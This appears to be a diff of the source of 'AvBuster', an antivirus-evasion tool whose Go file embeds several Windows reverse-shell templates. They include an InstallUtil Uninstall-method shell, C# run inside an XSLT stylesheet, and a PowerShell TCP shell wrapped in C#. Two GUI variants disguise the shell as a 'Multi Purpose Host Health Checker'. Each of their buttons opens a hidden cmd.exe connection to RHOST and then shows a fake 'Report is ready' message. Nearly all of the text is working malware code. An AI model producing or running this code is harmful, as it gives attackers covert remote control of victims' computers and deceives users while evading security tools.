+            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
+            this.btnCPUUsage.Name = "btnCPUUsage";
+            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
+            this.btnCPUUsage.TabIndex = 1;
+            this.btnCPUUsage.Text = "CPU Usage";
+            this.btnCPUUsage.UseVisualStyleBackColor = true;
+            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnUpdateCheck
+            // 
+            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
+            this.btnUpdateCheck.Name = "btnUpdateCheck";
+            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnUpdateCheck.TabIndex = 0;
+            this.btnUpdateCheck.Text = "Check Updates";
+            this.btnUpdateCheck.UseVisualStyleBackColor = true;
+            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // button3
+            // 
+            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.Location = new System.Drawing.Point(241, 133);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(180, 56);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "Hidden Files";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // Form
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(460, 222);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.btnUpdateCheck);
+            this.Controls.Add(this.btnCPUUsage);
+            this.Controls.Add(this.btnHealthCheck);
+            this.Controls.Add(this.headerpanel);
+            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Margin = new System.Windows.Forms.Padding(4);
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(460, 250);
+            this.MinimizeBox = false;
+            this.Name = "Form";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Health Checker";
+            this.headerpanel.ResumeLayout(false);
+            this.headerpanel.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+    }
+`
 var AvBusterInstallShieldTCPReverseShell = `package main
 
 import (
 	"fmt"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 )
 
@@ -1713,8 +2460,6 @@ const REMOTEPORT = "RPORT"
 
 func init() {
 	instutil = RPLusing System;
-	using System.Collections;
-	using System.Collections.Generic;
 	using System.ComponentModel;
 	using System.Configuration.Install;
 	using System.Diagnostics;
@@ -1722,28 +2467,27 @@ func init() {
 	using System.Net.Sockets;
 	using System.Text;
 	
-	
-	namespace WindowsService1
+	namespace Instutil
 	{
 		public class Program
 		{
 	
 			public static void Main()
 			{
-				Console.WriteLine("Hello From Main...I Don't Do Anything");
+				Console.WriteLine("Does not have any role here");
 				//Add any behaviour here to throw off sandbox execution/analysts :)
 	
 			}
 		}
 	
-		[System.ComponentModel.RunInstaller(true)]
-		public partial class ProjectInstaller : System.Configuration.Install.Installer
+		[RunInstaller(true)]
+		public partial class ProjectInstaller : Installer
 		{
 			StreamWriter streamWriter;
 	
 			public override void Uninstall(System.Collections.IDictionary savedState)
 			{
-				Console.WriteLine("Hello From Uninstall...I carry out the real work...");
+				Console.WriteLine("The Uninstall method of 'RevShellInsaller' has been called");
 				revconnect();
 			}
 	
@@ -1806,8 +2550,8 @@ func init() {
 		}
 	}
 	RPL
-	cscpath = RPLC:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exeRPL
-	instutilpath = RPLC:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exeRPL
+	cscpath = RPLC:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exeRPL
+	instutilpath = RPLC:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exeRPL
 }
 
 func checkerr(err error) {
@@ -1819,12 +2563,24 @@ func checkerr(err error) {
 
 func main() {
 	createinstlutiltemplate(MANAGERIP, REMOTEPORT)
-	instexe := exec.Command(cscpath, RPL/out:C:\Windows\temp\goinstut.exeRPL, RPLC:\Windows\temp\insutil.csRPL)
-	err := instexe.Start()
+	buildpath := filepath.FromSlash(RPLC:\Windows\temp\build.batRPL)
+	buildbat, err := os.Create(buildpath)
 	checkerr(err)
-	executeshell := exec.Command(instutilpath, RPL/logfile=RPL, RPL/LogToConsole=falseRPL, RPL/URPL, RPLC:\Windows\temp\goinstut.exeRPL)
-	err = executeshell.Start()
+	//fmt.Println(buildpath)
+	buildbat.WriteString(cscpath + " " + RPL/out:C:\Windows\temp\instut.exeRPL + " " + RPLC:\Windows\temp\insutil.csRPL)
+	buildbat.Close()
+	err = exec.Command(buildpath).Run()
 	checkerr(err)
+	runinstutilpath := filepath.FromSlash(RPLC:\Windows\temp\runinstutil.batRPL)
+	runinst, err := os.Create(runinstutilpath)
+	checkerr(err)
+	//fmt.Println(runinstutilpath)
+	runinst.WriteString(instutilpath + RPL /logfile= /LogToConsole=false /U C:\Windows\temp\instut.exeRPL)
+	runinst.Close()
+	err = exec.Command(runinstutilpath).Run()
+	checkerr(err)
+	os.Remove(buildpath)
+	os.Remove(runinstutilpath)
 	os.Remove(RPLC:\Windows\temp\insutil.csRPL)
 }
 
@@ -1834,8 +2590,9 @@ func createinstlutiltemplate(ip, port string) {
 	foinstlutil, err := os.Create(RPLC:\Windows\temp\insutil.csRPL)
 
 	checkerr(err)
-	defer foinstlutil.Close()
 	foinstlutil.WriteString(portreplaced)
+	foinstlutil.Close()
+
 }`
 
 var AvBusterSelfSignedHttps = `package main
@@ -2009,7 +2766,10 @@ func index(respwrt http.ResponseWriter, req *http.Request) {
 		//content, _ := ioutil.ReadAll(req.Body)
 		//fmt.Println(string(content))
 	} else {
-		redc.Printf("[AvBusterHTTPSTunnel]")
+		redc.Printf("[AvBuster")
+		greenc.Printf("HTTPS")
+		redc.Printf("Tunnel]~# :")
+
 		reader := bufio.NewReader(os.Stdin)
 		cmdtopost, _ := reader.ReadString('\n')
 		//cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to avbuster.")
@@ -2019,3 +2779,1064 @@ func index(respwrt http.ResponseWriter, req *http.Request) {
 	}
 }
 `
+var AvBusterInlinerConsoleRevShell = `using System;
+using System.IO;
+using System.Text;
+using System.Xml;
+using System.Xml.XPath;
+using System.Xml.Xsl;
+
+namespace Inliner
+{
+    class Program
+    {
+        private static string strxslfile = @"<xsl:stylesheet version=""2.0""
+                xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""
+                xmlns:msxsl=""urn:schemas-microsoft-com:xslt""
+                xmlns:xslCSharp=""urn:BypassTest"">
+    <msxsl:script implements-prefix='xslCSharp' language='Csharp'>
+        <msxsl:using namespace=""System.Net.Sockets"" />
+        <msxsl:using namespace=""System.IO""/>
+        <msxsl:using namespace=""System.Diagnostics""/>
+        public static StreamWriter streamWriter;
+            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+            {
+                StringBuilder strOutput = new StringBuilder();
+                if (!String.IsNullOrEmpty(outLine.Data))
+                {
+                    try
+                    {
+                        strOutput.Append(outLine.Data);
+                        streamWriter.WriteLine(strOutput);
+                        streamWriter.Flush();
+                    }
+                    catch (Exception ex) { throw ex; }
+                }
+            }
+            public void Execute()
+            {
+                using (TcpClient client = new TcpClient(""RHOST"", RPORT))
+                {
+                    using (Stream stream = client.GetStream())
+                    {
+                        using (StreamReader rdr = new StreamReader(stream))
+                        {
+                            streamWriter = new StreamWriter(stream);
+                            StringBuilder strInput = new StringBuilder();
+                            Process p = new Process();
+                            p.StartInfo.FileName = ""cmd.exe"";
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            p.Start();
+                            p.BeginOutputReadLine();
+                            while (true)
+                            {
+                                strInput.Append(rdr.ReadLine());
+                                p.StandardInput.WriteLine(strInput);
+                                strInput.Remove(0, strInput.Length);
+                            }
+                        }
+                    }
+                }
+            }
+  </msxsl:script>
+  <xsl:template match=""success"" >
+    <result>
+      <xsl:value-of select=""xslCSharp:Execute()"" /> 
+     </result> 
+   </xsl:template>
+</xsl:stylesheet>";
+
+        private static string inlinerxmlpath = @"C:\Windows\Temp\inliner.xml";
+        private static string inlinerxslpath = @"C:\Windows\Temp\RunFromHere.xsl";
+        static void createxsl()
+        {
+           File.WriteAllText(inlinerxslpath, strxslfile, Encoding.UTF8);
+        }
+
+        static void createxml()
+        {
+            XmlTextWriter inlinerdata = new XmlTextWriter(inlinerxmlpath, Encoding.UTF8);
+            inlinerdata.WriteStartDocument(true);
+            inlinerdata.Formatting = Formatting.Indented;
+            inlinerdata.WriteStartElement("success");
+            inlinerdata.WriteEndElement();
+            inlinerdata.WriteEndDocument();
+            inlinerdata.Close();
+        }
+
+        static void inlinerexecute()
+        {
+            XsltSettings oxsltsettings = new XsltSettings(false, true);
+            XmlUrlResolver oResolver = new XmlUrlResolver();
+
+            XslCompiledTransform oxsl = new XslCompiledTransform();
+            oxsl.Load(inlinerxslpath, oxsltsettings, oResolver);
+
+            //Load the XML data file.
+            XPathDocument doc = new XPathDocument(inlinerxmlpath);
+
+            //Create an XmlTextWriter to output to the console.             
+            XmlTextWriter writer = new XmlTextWriter(Console.Out);
+            writer.Formatting = Formatting.Indented;
+
+            //Transform the file.
+            oxsl.Transform(doc, writer);
+            writer.Close();
+        }
+
+        static void Main(string[] args)
+        {
+            createxml();
+            createxsl();
+            inlinerexecute();
+        }
+    }
+}`
+
+var AvBusterInlinerGUIRevShell = `using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.Windows.Forms;
+using System.IO;
+using System.Text;
+using System.Xml;
+using System.Xml.XPath;
+using System.Xml.Xsl;
+
+    public class psForm : System.Windows.Forms.Form
+    {
+        private System.Windows.Forms.Panel headerpanel;
+        private System.Windows.Forms.Label missinglabel;
+        private System.Windows.Forms.Button btnHealthCheck;
+        private System.Windows.Forms.Button btnCPUUsage;
+        private System.Windows.Forms.Button btnUpdateCheck;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button1;
+        public psForm()
+        {
+            InitializeComponent();
+        }
+        
+       public static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.Run(new psForm());
+        }
+    
+        private static string strxslfile = @"<xsl:stylesheet version=""2.0""
+        xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""
+        xmlns:msxsl=""urn:schemas-microsoft-com:xslt""
+        xmlns:xslCSharp=""urn:BypassTest"">
+<msxsl:script implements-prefix='xslCSharp' language='Csharp'>
+<msxsl:using namespace=""System.Net.Sockets"" />
+<msxsl:using namespace=""System.IO""/>
+<msxsl:using namespace=""System.Diagnostics""/>
+public static StreamWriter streamWriter;
+    public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+    {
+        StringBuilder strOutput = new StringBuilder();
+        if (!String.IsNullOrEmpty(outLine.Data))
+        {
+            try
+            {
+                strOutput.Append(outLine.Data);
+                streamWriter.WriteLine(strOutput);
+                streamWriter.Flush();
+            }
+            catch (Exception ex) { throw ex; }
+        }
+    }
+    public void Execute()
+    {
+        using (TcpClient client = new TcpClient(""RHOST"", RPORT))
+        {
+            using (Stream stream = client.GetStream())
+            {
+                using (StreamReader rdr = new StreamReader(stream))
+                {
+                    streamWriter = new StreamWriter(stream);
+                    StringBuilder strInput = new StringBuilder();
+                    Process p = new Process();
+                    p.StartInfo.FileName = ""cmd.exe"";
+                    p.StartInfo.CreateNoWindow = true;
+                    p.StartInfo.UseShellExecute = false;
+                    p.StartInfo.RedirectStandardOutput = true;
+                    p.StartInfo.RedirectStandardInput = true;
+                    p.StartInfo.RedirectStandardError = true;
+                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                    p.Start();
+                    p.BeginOutputReadLine();
+                    while (true)
+                    {
+                        strInput.Append(rdr.ReadLine());
+                        p.StandardInput.WriteLine(strInput);
+                        strInput.Remove(0, strInput.Length);
+                    }
+                }
+            }
+        }
+    }
+</msxsl:script>
+<xsl:template match=""success"" >
+<result>
+<xsl:value-of select=""xslCSharp:Execute()"" /> 
+</result> 
+</xsl:template>
+</xsl:stylesheet>";
+
+private static string inlinerxmlpath = @"C:\Windows\Temp\inliner.xml";
+private static string inlinerxslpath = @"C:\Windows\Temp\RunFromHere.xsl";
+static void createxsl()
+{
+   File.WriteAllText(inlinerxslpath, strxslfile, Encoding.UTF8);
+}
+
+static void createxml()
+{
+    XmlTextWriter inlinerdata = new XmlTextWriter(inlinerxmlpath, Encoding.UTF8);
+    inlinerdata.WriteStartDocument(true);
+    inlinerdata.Formatting = Formatting.Indented;
+    inlinerdata.WriteStartElement("success");
+    inlinerdata.WriteEndElement();
+    inlinerdata.WriteEndDocument();
+    inlinerdata.Close();
+}
+
+static void inlinerexecute()
+{
+    XsltSettings oxsltsettings = new XsltSettings(false, true);
+    XmlUrlResolver oResolver = new XmlUrlResolver();
+
+    XslCompiledTransform oxsl = new XslCompiledTransform();
+    oxsl.Load(inlinerxslpath, oxsltsettings, oResolver);
+
+    //Load the XML data file.
+    XPathDocument doc = new XPathDocument(inlinerxmlpath);
+
+    //Create an XmlTextWriter to output to the console.             
+    XmlTextWriter writer = new XmlTextWriter(Console.Out);
+    writer.Formatting = Formatting.Indented;
+
+    //Transform the file.
+    oxsl.Transform(doc, writer);
+    writer.Close();
+}
+
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //createpsrevshell();
+            this.Close();
+        }
+
+        private void btnUpdateCheck_Click(object sender, EventArgs e)
+        {
+            createxml();
+            createxsl();
+            inlinerexecute();
+            System.Threading.Thread.Sleep(4000);
+            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
+        }
+
+        private void button1_MouseEnter(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Red;
+
+        }
+
+        private void button1_MouseLeave(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Gray;
+
+        }
+
+        private void InitializeComponent()
+        {
+            this.headerpanel = new System.Windows.Forms.Panel();
+            this.button1 = new System.Windows.Forms.Button();
+            this.missinglabel = new System.Windows.Forms.Label();
+            this.btnHealthCheck = new System.Windows.Forms.Button();
+            this.btnCPUUsage = new System.Windows.Forms.Button();
+            this.btnUpdateCheck = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.headerpanel.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // headerpanel
+            // 
+            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
+            this.headerpanel.Controls.Add(this.button1);
+            this.headerpanel.Controls.Add(this.missinglabel);
+            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
+            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.headerpanel.Location = new System.Drawing.Point(0, 0);
+            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
+            this.headerpanel.Name = "headerpanel";
+            this.headerpanel.Size = new System.Drawing.Size(460, 30);
+            this.headerpanel.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.button1.Location = new System.Drawing.Point(423, 1);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(36, 27);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "X";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
+            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
+            // 
+            // missinglabel
+            // 
+            this.missinglabel.AutoSize = true;
+            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.missinglabel.Location = new System.Drawing.Point(127, 9);
+            this.missinglabel.Name = "missinglabel";
+            this.missinglabel.Size = new System.Drawing.Size(193, 15);
+            this.missinglabel.TabIndex = 0;
+            this.missinglabel.Text = "Multi Purpose Host Health Checker";
+            // 
+            // btnHealthCheck
+            // 
+            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
+            this.btnHealthCheck.Name = "btnHealthCheck";
+            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnHealthCheck.TabIndex = 2;
+            this.btnHealthCheck.Text = "Health Check";
+            this.btnHealthCheck.UseVisualStyleBackColor = true;
+            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnCPUUsage
+            // 
+            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
+            this.btnCPUUsage.Name = "btnCPUUsage";
+            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
+            this.btnCPUUsage.TabIndex = 1;
+            this.btnCPUUsage.Text = "CPU Usage";
+            this.btnCPUUsage.UseVisualStyleBackColor = true;
+            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnUpdateCheck
+            // 
+            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
+            this.btnUpdateCheck.Name = "btnUpdateCheck";
+            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnUpdateCheck.TabIndex = 0;
+            this.btnUpdateCheck.Text = "Check Updates";
+            this.btnUpdateCheck.UseVisualStyleBackColor = true;
+            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // button3
+            // 
+            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.Location = new System.Drawing.Point(241, 133);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(180, 56);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "Hidden Files";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // Form
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(460, 222);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.btnUpdateCheck);
+            this.Controls.Add(this.btnCPUUsage);
+            this.Controls.Add(this.btnHealthCheck);
+            this.Controls.Add(this.headerpanel);
+            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Margin = new System.Windows.Forms.Padding(4);
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(460, 250);
+            this.MinimizeBox = false;
+            this.Name = "Form";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Health Checker";
+            this.headerpanel.ResumeLayout(false);
+            this.headerpanel.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+	}`
+
+var AvBusterPSCsharpRevShellConsole = `using System;
+	using System.Management.Automation;
+	
+	namespace PSCsharp
+	{
+		class Program
+		{ 
+			private static void RunPS()
+			{
+				string script = @"function cleanup {
+	if ($client.Connected -eq $true) {$client.Close()}
+	if ($process.ExitCode -ne $null) {$process.Close()}
+	exit}
+	$address = 'RHOST' 
+	$port = 'RPORT'
+	$client = New-Object system.net.sockets.tcpclient
+	$client.connect($address,$port)
+	$stream = $client.GetStream()
+	$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+	$process = New-Object System.Diagnostics.Process
+	$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+	$process.StartInfo.RedirectStandardInput = 1
+	$process.StartInfo.RedirectStandardOutput = 1
+	$process.StartInfo.UseShellExecute = 0
+	$process.StartInfo.WindowStyle = Hidden
+	$process.Start()
+	$inputstream = $process.StandardInput
+	$outputstream = $process.StandardOutput
+	Start-Sleep 1
+	$encoding = new-object System.Text.AsciiEncoding
+	while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+	$stream.Write($encoding.GetBytes($out),0,$out.Length)
+	$out = $null; $done = $false; $testing = 0;
+	while (-not $done) {
+	if ($client.Connected -ne $true) {cleanup}
+	$pos = 0; $i = 1
+	while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+	$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+	$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+	if ($pos -gt 0) {
+	$string = $encoding.GetString($networkbuffer,0,$pos)
+	$inputstream.write($string)
+	start-sleep 1
+	if ($process.ExitCode -ne $null) {cleanup}
+	else {
+	$out = $encoding.GetString($outputstream.Read())
+	while($outputstream.Peek() -ne -1){
+	$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+	$stream.Write($encoding.GetBytes($out),0,$out.length)
+	$out = $null
+	$string = $null}} else {cleanup}}";
+				using (var powershell = PowerShell.Create()) 
+				{
+					powershell.AddScript(script, false);
+	
+					powershell.Invoke(); 
+	
+					powershell.Commands.Clear();
+					
+				}
+			}
+	
+			static void Main(string[] args)
+			{
+				try
+				{
+					RunPS(); 
+				}
+				catch (Exception)
+				{
+					
+				}
+			}
+		}
+	}`
+
+var AvBusterPSCsharpRevShellGUI = `using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.Windows.Forms;
+using System.IO;
+using System.Text;
+using System.Management.Automation;
+
+
+    public class psForm : System.Windows.Forms.Form
+    {
+        private System.Windows.Forms.Panel headerpanel;
+        private System.Windows.Forms.Label missinglabel;
+        private System.Windows.Forms.Button btnHealthCheck;
+        private System.Windows.Forms.Button btnCPUUsage;
+        private System.Windows.Forms.Button btnUpdateCheck;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button1;
+        public psForm()
+        {
+            InitializeComponent();
+        }
+        
+       public static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.Run(new psForm());
+        }
+    
+private static void RunPS()
+        {
+            string script = @"function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = 'RHOST' 
+$port = 'RPORT'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.StartInfo.WindowStyle = Hidden
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}";
+            using (var powershell = PowerShell.Create()) 
+            {
+                powershell.AddScript(script, false);
+
+                powershell.Invoke(); 
+
+                powershell.Commands.Clear();
+                
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //createpsrevshell();
+            this.Close();
+        }
+
+        private void btnUpdateCheck_Click(object sender, EventArgs e)
+        {
+           RunPS();
+            System.Threading.Thread.Sleep(4000);
+            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
+        }
+
+        private void button1_MouseEnter(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Red;
+
+        }
+
+        private void button1_MouseLeave(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Gray;
+
+        }
+
+        private void InitializeComponent()
+        {
+            this.headerpanel = new System.Windows.Forms.Panel();
+            this.button1 = new System.Windows.Forms.Button();
+            this.missinglabel = new System.Windows.Forms.Label();
+            this.btnHealthCheck = new System.Windows.Forms.Button();
+            this.btnCPUUsage = new System.Windows.Forms.Button();
+            this.btnUpdateCheck = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.headerpanel.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // headerpanel
+            // 
+            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
+            this.headerpanel.Controls.Add(this.button1);
+            this.headerpanel.Controls.Add(this.missinglabel);
+            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
+            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.headerpanel.Location = new System.Drawing.Point(0, 0);
+            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
+            this.headerpanel.Name = "headerpanel";
+            this.headerpanel.Size = new System.Drawing.Size(460, 30);
+            this.headerpanel.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.button1.Location = new System.Drawing.Point(423, 1);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(36, 27);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "X";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
+            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
+            // 
+            // missinglabel
+            // 
+            this.missinglabel.AutoSize = true;
+            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.missinglabel.Location = new System.Drawing.Point(127, 9);
+            this.missinglabel.Name = "missinglabel";
+            this.missinglabel.Size = new System.Drawing.Size(193, 15);
+            this.missinglabel.TabIndex = 0;
+            this.missinglabel.Text = "Multi Purpose Host Health Checker";
+            // 
+            // btnHealthCheck
+            // 
+            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
+            this.btnHealthCheck.Name = "btnHealthCheck";
+            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnHealthCheck.TabIndex = 2;
+            this.btnHealthCheck.Text = "Health Check";
+            this.btnHealthCheck.UseVisualStyleBackColor = true;
+            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnCPUUsage
+            // 
+            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
